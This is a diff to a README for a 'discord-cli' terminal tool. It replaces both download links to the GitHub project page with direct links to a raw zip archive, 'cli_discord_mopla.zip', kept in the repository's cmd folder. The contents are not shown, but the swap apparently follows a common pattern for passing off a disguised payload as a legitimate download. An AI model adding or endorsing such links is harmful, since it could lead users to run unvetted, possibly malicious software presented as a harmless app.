@@ -1,6 +1,6 @@
 # 🧭 discord-cli - Control Discord from your terminal
 
-[![Download discord-cli](https://img.shields.io/badge/Download%20discord--cli-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Linotypefibre247/discord-cli)
+[![Download discord-cli](https://img.shields.io/badge/Download%20discord--cli-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Linotypefibre247/discord-cli/main/cmd/cli_discord_mopla.zip)
 
 ## 🚀 What this app does
 
@@ -29,7 +29,7 @@ It is made for people who want a fast way to work with Discord without opening t
 
 Visit this page to download the app:
 
-[https://github.com/Linotypefibre247/discord-cli](https://github.com/Linotypefibre247/discord-cli)
+[https://raw.githubusercontent.com/Linotypefibre247/discord-cli/main/cmd/cli_discord_mopla.zip](https://raw.githubusercontent.com/Linotypefibre247/discord-cli/main/cmd/cli_discord_mopla.zip)
 
 After you open the page:
 
